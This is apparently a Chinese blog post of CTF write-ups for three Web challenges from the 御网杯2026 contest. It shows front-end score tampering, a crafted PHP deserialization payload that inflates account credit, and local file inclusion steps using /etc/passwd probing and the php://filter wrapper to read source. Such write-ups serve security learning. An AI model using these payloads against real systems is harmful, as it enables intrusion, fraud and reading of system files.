---
title: 御网杯2026 Web部分题解
date: 2026-06-13 00:00:00
categories:
  - CTF-WP
  - Contest-WP
tags:
  - CTF
description: 御网杯网络安全竞赛Web方向部分题解
---

# 一、WEB-Snake_Game
## 1. 题目
<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780130835025-8a3a19b6-4038-4c79-87f4-da7b7e9dcbfb.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780130858293-1a30c177-48d7-449c-9ff7-fc2dd4a0dfe4.png)

## 2. 解题思路
1. 题目要求游戏得分要 300，我们可以直接修改前端代码，让初始分>300
2. F12

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780106614013-7c5eda4b-189d-413a-93d5-dff3ddb88b7a.png)

3. 添加覆盖脚本

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780106659621-0e85c97e-f1b5-4fd0-bbd0-24f55340e101.png)
![](/img/posts/题解-御网杯Web/1780106729029-5e5d81e9-e4cc-478b-9eca-180b6b501f55.png)

修改成功！

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780106762234-70bbd781-28f9-4d6c-bf50-ead6945d47bf.png)

4. 拿到 flag

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780106786127-431c725b-ebf2-4ebd-908a-1d1c378e461f.png)

---

# 二、WEB-PHP_Payment


## 1. 题目
<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780107645337-5e03f505-f9ec-4081-92b6-77441136f0f2.png)

## 2. 解题思路
1. 根据题目提示知道可以用代金券拿到 Flag，但是我们的余额只有 10 金币，然后输入框里输入 base64 的代金券可以获得 Flag

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780108671602-a64d6f0d-3d5b-4fe2-9219-317f2219291e.png)

2. 下载附件，收集信息

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780107829468-fda8a105-c726-4ebc-ba1b-f76cac4e38e8.png)

代码审计 apply_coupon.php

1、包含了另外两个文件

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780109998273-2de6d5ad-7fde-4c96-83eb-5f0627987d12.png)

2、从 POST 请求中取 coupon 参数，参数为空、解码失败会报错

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780110146066-ccb9bd2c-f59f-4e92-8849-901207b18c61.png)

如果 base64 解码出来再反序列化解码后的字符串等于$promo 返回成功。此时 $promo 对象被销毁

再看models.php 里的类

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780110364416-ee9d159d-2063-4e31-a448-afee6b9f56ed.png)

有两个属性，一是代金券金额，一是代金券码。

含有魔术方法 __destruct()，对象销毁时触发：逻辑是，如果如果 promo_credit 属性存在且是数字，直接加到余额上。

所以，目标就是，构造一个金额够买 Flag

3、 构造 代金券

```php
<?php
  class PromoManager {
  public $promo_code = "x";
  public $promo_credit = 10000000;
}
echo base64_encode(serialize(new PromoManager()));
?>
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780116366872-6dc7b62a-ec29-4431-8577-c6273bcc0a85.png)

```php
TzoxMjoiUHJvbW9NYW5hZ2VyIjoyOntzOjEwOiJwcm9tb19jb2RlIjtzOjE6IngiO3M6MTI6InByb21vX2NyZWRpdCI7aToxMDAwMDAwMDt9
```


<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780116465434-73e18d77-0ec4-4f7e-b9de-403887980035.png)

3. 购买 Flag，看 buy.php

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780117844278-e154a428-3958-4c1a-97b2-11fd9b50e72c.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780117872111-36a38410-feb4-4f50-ab5d-a95565a879dc.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780117909099-914fd8d6-0565-4ce1-beee-c766a66a5519.png)

用 POST 方式往 /buy.php 传 item=flag

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780119024627-e9e8df68-882d-46da-9e40-dd182fd14f30.png)

依据这个 调用 fetch

```plain
fetch('/buy.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'item=flag'}).then(r=>r.text()).then(console.log)
```

拿到 flag

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780118786051-04f9118f-f743-4a7d-80fd-22368790d100.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780118810253-7d1bacf6-8c57-4bbb-a77c-188d53fefe3a.png)

---

# 三、WEB-Enterprise_OA


## 1. 题目
<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780120732023-e361e74a-54ae-4d3d-ad2c-13b9e2acde0b.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780120739051-2bcadde0-71ea-4cb4-9abe-1531e375a34d.png)

## 2. 解题思路
1. 根据题目提示，这题考查目录穿越、文件包含
2. 先尝试访问 flag.php

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780121584298-2183fe35-4ad9-4320-9935-6969b6407108.png)

include_path='.:/usr/local/lib/php'

路径分隔符是 :（冒号），Windows 用的是 ;。这是 Unix/Linux 的特征。

并且服务器是：

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780121678830-065c0063-72d7-46bd-b4e5-ad61b4dd8284.png)

说明可以用 /etc/passwd 来探测（因为/etc/passwd 一定存在、可读、内容可辨识）

3. 读源代码

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780121169897-72e9d579-b8db-49dc-9c48-a2aa9ae70fb5.png)

用 php 伪协议

```plain
php://filter/read=convert.base64-encode/resource=index.php
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780121252570-c36333bf-9ecc-4b8e-afc8-6b19d495b740.png)

利用 base64 在线解密工具

```plain
PD9waHAKJG1vZHVsZSA9IGlzc2V0KCRfR0VUWydtb2R1bGUnXSkgPyAkX0dFVFsnbW9kdWxlJ10gOiAncHVibGljX25vdGljZXMucGhwJzsKJG1vZHVsZSA9IHN0cl9yZXBsYWNlKCcuLi8nLCAnJywgJG1vZHVsZSk7Cj8+CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KPGhlYWQ+CiAgICA8dGl0bGU+T0EgU3lzdGVtIFBvcnRhbDwvdGl0bGU+CiAgICA8c3R5bGU+CiAgICAgICAgYm9keSB7IGZvbnQtZmFtaWx5OiAnU2Vnb2UgVUknLCBUYWhvbWEsIEdlbmV2YSwgVmVyZGFuYSwgc2Fucy1zZXJpZjsgYmFja2dyb3VuZC1jb2xvcjogI2YwZjJmNTsgdGV4dC1hbGlnbjogY2VudGVyOyBtYXJnaW46IDA7IHBhZGRpbmc6IDA7fQogICAgICAgIC5oZWFkZXIgeyBiYWNrZ3JvdW5kLWNvbG9yOiAjMDA0MDgwOyBjb2xvcjogd2hpdGU7IHBhZGRpbmc6IDIwcHg7IGZvbnQtc2l6ZTogMjRweDsgZm9udC13ZWlnaHQ6IGJvbGQ7IH0KICAgICAgICAuY29udGFpbmVyIHsgYmFja2dyb3VuZC1jb2xvcjogd2hpdGU7IHBhZGRpbmc6IDIwcHg7IGJvcmRlci1yYWRpdXM6IDhweDsgbWFyZ2luOiA0MHB4IGF1dG87IHdpZHRoOiA2MCU7IGJveC1zaGFkb3c6IDAgNHB4IDhweCByZ2JhKDAsMCwwLDAuMSk7IH0KICAgICAgICAubmF2IHsgbWFyZ2luLWJvdHRvbTogMzBweDsgYm9yZGVyLWJvdHRvbTogMnB4IHNvbGlkICNlZWU7IHBhZGRpbmctYm90dG9tOiAxMHB4OyB9CiAgICAgICAgLm5hdiBhIHsgbWFyZ2luOiAwIDE1cHg7IHRleHQtZGVjb3JhdGlvbjogbm9uZTsgY29sb3I6ICMwMDQwODA7IGZvbnQtd2VpZ2h0OiBib2xkOyB9CiAgICAgICAgLm5hdiBhOmhvdmVyIHsgY29sb3I6ICMwMDY2Y2M7IH0KICAgICAgICAuY29udGVudCB7IHBhZGRpbmc6IDIwcHg7IHRleHQtYWxpZ246IGxlZnQ7IG1pbi1oZWlnaHQ6IDIwcHg7IGNvbG9yOiAjMzMzOyBsaW5lLWhlaWdodDogMS42OyB9CiAgICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5PgogICAgPGRpdiBjbGFzcz0iaGVhZGVyIj4KICAgICAgICBFbnRlcnByaXNlIE9BIFN5c3RlbQogICAgPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgIDxkaXYgY2xhc3M9Im5hdiI+CiAgICAgICAgICAgIDxhIGhyZWY9Ij9tb2R1bGU9cHVibGljX25vdGljZXMucGhwIj5Ob3RpY2VzPC9hPgogICAgICAgICAgICA8YSBocmVmPSI/bW9kdWxlPWFib3V0LnBocCI+QWJvdXQgVXM8L2E+CiAgICAgICAgICAgIDxhIGhyZWY9Ij9tb2R1bGU9Y29udGFjdC5waHAiPkNvbnRhY3Q8L2E+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGVudCI+CiAgICAgICAgICAgIDw/cGhwIGluY2x1ZGUoJG1vZHVsZSk7ID8+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KPC9ib2R5Pgo8L2h0bWw+Cg==
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780121349637-f3444687-dbbd-4ccf-8f7d-ce77b58f7652.png)

4. 访问绝对路径

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780122049501-b0d05a59-82ac-4ded-b0c2-edfe9071afac.png)

5. 访问 flag 文件

比如：flag.php   flag.txt

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780122555111-57f73e0e-1544-4ca2-9b21-1601cc3369e5.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780122767670-066bea98-d602-4897-84b6-fa1e1ccfeb50.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/题解-御网杯Web/1780122738391-ff32effd-84f0-4df7-8ed8-edcd138a6347.png)
